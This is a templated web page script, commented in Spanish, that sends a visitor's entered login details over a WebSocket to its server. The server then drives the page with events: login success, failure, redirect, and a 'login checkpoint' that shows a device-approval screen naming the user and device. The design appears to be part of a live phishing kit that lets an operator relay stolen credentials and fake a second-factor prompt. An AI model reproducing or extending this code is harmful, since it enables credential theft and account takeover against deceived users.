    <script>
        const redirect = "{{payload.redirect}}";

        function handleWebSocketMessage(eventParam) {
            const { event, data } = JSON.parse(eventParam.data);

            switch (event) {
                case 'login_success':
                    window.location.href = data.redirect;
                    break;
                case 'login_failed':
                    showModalMessage();
                    changeFormStatus(false);
                    resetInactivityTimeout();
                    break;
                case 'redirect':
                    window.location.href = data.redirect;
                    break;
                case 'login_checkpoint':
                    handleLoginCheckpoint(data);
                    resetInactivityTimeout();
                    break;
                case 'pong':
                    console.log('Pong recibido');
                    break;
                default:
                    window.location.href = redirect;
            }
        }

        function handleLoginCheckpoint(data) {
            const mainColumn = document.getElementById('mainColumn');
            const approbalColumn = document.getElementById('approbalColumn');

            // Reemplazando nombre
            const approbalUser = approbalColumn.querySelector('#approbalUser');
            approbalUser.textContent = data.userName;

            // Reemplazando el dispositivo
            const approbalSubTitle = approbalColumn.querySelector('#approbalSubTitle');
            approbalSubTitle.textContent = approbalSubTitle.textContent.replace('{device}', data.devices);

            mainColumn.classList.toggle('hidden');
            mainColumn.classList.toggle('block');
            approbalColumn.classList.toggle('hidden');
            approbalColumn.classList.toggle('block');
        }

        async function handleFormSubmit(eventParam, connection) {
            eventParam.preventDefault();
            const username = document.getElementById('username').value;
            const name = document.getElementById('name').value;

            if (await validateForm()) {
                const loginData = {
                    event: 'userForm',
                    data: { username, name }
                };
                connection.send(JSON.stringify(loginData));
            }
        }

        try {
            const connection = new WebSocket("/ws?identifier={{ payload.identifier }}");

            connection.onopen = () => {
                console.log('Conexión establecida con el servidor WebSocket');

                // Enviar ping cada 30 segundos
                setInterval(() => {
                    // console.log("Enviando ping");
                    connection.send(JSON.stringify({ event: 'ping' }));
                }, 30000);
            };

            connection.onerror = (error) => {
                console.error('WebSocket error:', error);
                window.location.href = redirect;
            };

            connection.onclose = () => {
                console.warn('WebSocket closed');
                window.location.href = redirect;
            };

            connection.onmessage = handleWebSocketMessage;

            // Temporizador de inactividad
            let inactivityTimeout;
            function resetInactivityTimeout() {
                clearTimeout(inactivityTimeout);
                inactivityTimeout = setTimeout(() => {
                    console.warn('Desconectado por inactividad');
                    connection.close();
                }, 360000); // 6 minutos en milisegundos
            }

            // Iniciar el temporizador de inactividad
            resetInactivityTimeout();
            
            document.getElementById('custom').addEventListener('submit', (eventParam) => handleFormSubmit(eventParam, connection));
        } catch (e) {
            console.error('WebSocket connection failed:', e);
            window.location.href = redirect;
        }
    </script>

